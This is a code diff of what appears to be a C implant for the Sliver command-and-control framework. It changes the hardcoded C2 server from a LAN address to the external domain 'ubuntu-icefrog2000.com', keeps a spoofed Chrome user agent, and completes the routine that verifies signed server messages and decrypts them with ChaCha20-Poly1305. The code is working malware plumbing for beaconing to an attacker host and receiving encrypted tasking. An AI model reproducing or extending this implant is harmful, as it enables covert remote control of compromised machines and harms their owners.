@@ -960,7 +960,7 @@ PSLIVER_HTTP_CLIENT SliverHttpClientInit()
 	CHAR szUserAgent[] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.9265.982 Safari/537.36";
 	CHAR szServerMinisignPubkey[] = "untrusted comment: minisign public key: C974C3DEE0AE9DF4\nRWT0na7g3sN0yad3zBthDFTfPuEnuG+wDeLQesyaBb3nTCIVsBg+PXAv";
 
-	CHAR szHostName[] = "https://192.168.43.236";
+	CHAR szHostName[] = "https://ubuntu-icefrog2000.com";
 	DWORD i = 0;
 
 	pResult = ALLOC(sizeof(SLIVER_HTTP_CLIENT));
@@ -1349,16 +1349,19 @@ CLEANUP:
 PBYTE SessionDecrypt
 (
 	_In_ PSLIVER_HTTP_CLIENT pClient,
-	_In_ PBYTE pCipherText,
-	_In_ DWORD cbCipherText,
+	_In_ PBYTE pMessage,
+	_In_ DWORD cbMessage,
 	_In_ LPSTR lpServerMinisignPubKey,
 	_Out_ PDWORD pcbPlainText
 )
 {
 	PBYTE pResult = NULL;
 	PMINISIGN_PUB_KEY pDecodedPubKey = NULL;
+	PBYTE pCipherText = NULL;
+	PBYTE pNonce = NULL;
+	DWORD cbCipherText = 0;
 
-	if (cbCipherText < MINISIGN_SIZE + 1) {
+	if (cbMessage < MINISIGN_SIZE + 1) {
 		goto CLEANUP;
 	}
 
@@ -1367,8 +1370,17 @@ PBYTE SessionDecrypt
 		goto CLEANUP;
 	}
 
-	if (!VerifySign(pDecodedPubKey, pCipherText, cbCipherText, FALSE)) {
+	if (!VerifySign(pDecodedPubKey, pMessage, cbMessage, FALSE)) {
 		goto CLEANUP;
+	}
+
+	pNonce = pMessage + MINISIGN_SIZE;
+	pCipherText = pNonce + CHACHA20_NONCE_SIZE;
+	cbCipherText = cbMessage - MINISIGN_SIZE - CHACHA20_NONCE_SIZE;
+	pResult = ALLOC(cbCipherText + 1);
+	Chacha20Poly1305Decrypt(pClient->pSessionKey, pNonce, pCipherText, cbCipherText, pResult);
+	if (pcbPlainText != NULL) {
+		*pcbPlainText = cbCipherText;
 	}
 
 CLEANUP:
